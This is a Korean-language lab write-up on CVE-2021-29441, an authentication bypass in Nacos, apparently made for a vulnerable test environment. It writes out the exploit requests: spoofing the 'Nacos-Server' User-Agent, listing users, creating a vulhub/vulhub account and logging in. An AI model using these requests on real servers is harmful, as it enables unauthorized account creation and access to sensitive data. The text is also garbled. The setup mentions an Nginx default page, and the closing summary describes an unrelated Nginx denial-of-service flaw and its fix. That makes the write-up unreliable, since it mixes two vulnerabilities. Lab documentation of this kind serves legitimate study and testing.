# CVE-2021-29441

**Contributors**

-   [최준성(@Jastes)](https://github.com/Jastes)

<br/>

### 요약

- `Nacos`는 클라우드 네이티브 애플리케이션을 관리하기 위한 오픈 소스 플랫폼으로, 동적 서비스 검색, 구성 관리, 및 서비스 관리를 제공
- `Nacos`의 취약점은 인증 및 권한 부여 과정에서 _"Nacos-Server"_ 사용자 에이전트의 요청을 확인하지 않아 발생함
    <br/> └ 이를 통해 무단 접근을 통해 공격자는 민감한 정보에 접근이 가능해짐(구성이 간단하기에 가능함)

<br/>

### 환경 구성 및 실행

-   `docker compose up -d` 를 실행하여 테스트 환경을 실행함.
-   `http://your-ip:8848/` 에 접속하여 Nginx 기본 페이지를 확인함. <br>└ 경우에 따라 안될 수 있으니 서비스를 제시작과 포트 확인이 필요함
-   `python3 poc.py http://your-ip:8848/` 를 호출하여 반환 결과를 읽음. 결과에서 "HTTP 응답 본문" 앞에 있는 "파일 헤더", "HTTP 응답 헤더" 등의 내용을 읽을 수 있음.

<br/>

### 스크립트 활용
```bash
python poc.py http://target:8848
```
![](/nacos/CVE-2021-29441/img/1.png)

<br/>

### 결과
취약성 악용 프로세스는 다음과 같습니다.

1. 요청 패키지에서 User-Agent의 값을 Nacos-Server로 변경
2. http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 상태 코드가 `200` 인지, 컨텐츠에 포함되어 있는지 확인 `pageItems`
3. http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub `POST` 방법을 사용하여 새 사용자를 추가
4. http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 기존 사용자 목록
5. http://target:8848/nacos/ ( vulhub / vulhub )을 추가 한 새 사용자를 사용하여 로그인

> 취약점의 존재 감지

![](/nacos/CVE-2021-29441/img/2.png)

헤더를 추가한 후 
```bash
http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
```
리턴 값이 `200` 인지, Content에 포함되어 있는지 `pageItems` 확인

> 새 사용자 추가

![](/nacos/CVE-2021-29441/img/3.png)

헤더를 추가한 후 게시 요청
```bash
http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub
```

`vulhub` 의 계정과 비밀번호를 사용해 새 사용자를 추가함

> 새로 만든 계정을 사용하여 로그인

![](/nacos/CVE-2021-29441/img/4.png)

<br/>

### 정리

> 구버전(0.5.6부터 1.13.2 버전까지)의 Nginx 웹 서버에서 발견된 원격 공격을 통한 서비스 거부 취약점 

- 공격자가 특정 조건에서 웹 서버를 중단시키는 것이 가능 
- 적절한 웹 서버 구성 및 업데이트(1.13.2 버전보다 업그래이드)로 방지 가능
